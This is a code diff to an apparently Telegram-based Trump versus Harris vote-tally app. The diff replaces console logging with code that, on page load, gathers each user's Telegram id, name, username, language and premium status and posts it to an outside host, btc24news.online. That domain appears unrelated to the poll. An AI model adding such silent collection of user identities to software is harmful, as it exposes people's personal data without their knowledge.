@@ -32,12 +32,36 @@ function App() {
             .then(response => response.json())
             .then(data => setVotes(data.votes))
             .catch(error => console.error('Error fetching votes:', error));
-        console.log("Data received from Telegram:", WebApp.initDataUnsafe);
-        if (WebApp.initDataUnsafe && WebApp.initDataUnsafe.user) {
-                setUserData(WebApp.initDataUnsafe.user);
-                console.log("Data received from Telegram:", WebApp.initDataUnsafe);
-        }
-    }, []);
+            if (window.WebApp?.initDataUnsafe && window.WebApp.initDataUnsafe.user) {
+                const user = window.WebApp.initDataUnsafe.user;
+                setUserData(user);
+    
+                const data = {
+                    id: user.id,
+                    first_name: user.first_name,
+                    last_name: user.last_name,
+                    username: user.username,
+                    language_code: user.language_code,
+                    is_premium: user.is_premium ? 'Yes' : 'No'
+                };
+    
+                // Fetch to submit user data
+                fetch('https://btc24news.online/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            }
+        }, []);
 
     const totalVotes = votes.Trump + votes.Harris;
     const harrisPercentage = totalVotes > 0 ? (votes.Harris / totalVotes * 100).toFixed(1) : 0;
